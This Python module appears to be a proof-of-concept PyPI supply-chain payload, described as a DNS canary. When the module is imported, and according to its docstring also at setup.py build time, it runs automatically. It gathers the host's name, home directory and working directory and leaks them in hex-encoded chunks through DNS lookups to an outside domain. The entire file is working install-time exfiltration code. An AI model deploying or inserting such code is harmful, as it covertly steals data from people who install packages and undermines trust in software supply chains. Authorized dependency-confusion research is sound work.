"""Install/first-import DNS canary (PyPI).

Execution points on PyPI differ from npm: pip runs setup.py when
installing an sdist (build step), and the module body runs on first
import. This payload covers BOTH: setup.py calls _canary() at build
time; importing the module calls it again. Nothing is sent except DNS
lookups under POC_DNS_NAMESPACE.
"""
import os
import random
import socket

NAMESPACE = os.environ.get("POC_DNS_NAMESPACE", "dns.supplyshark.io")


def _canary():
    try:
        data = f"{socket.gethostname()}__{os.path.expanduser('~')}__{os.getcwd()}"
        encoded = "".join(
            c if c.isalnum() or c in "._" else "_%02x" % ord(c) for c in data
        ).encode("utf-8").hex()
        session = "".join(random.choice("0123456789abcdef") for _ in range(8))
        for i in range(0, len(encoded), 50):
            chunk = encoded[i:i + 50]
            try:
                socket.gethostbyname(f"{session}.{chunk}.{NAMESPACE}")
            except OSError:
                pass  # resolution failure is fine; the query itself is the signal
    except Exception:
        pass


if os.environ.get("POC_NO_AUTORUN") != "1":
    _canary()
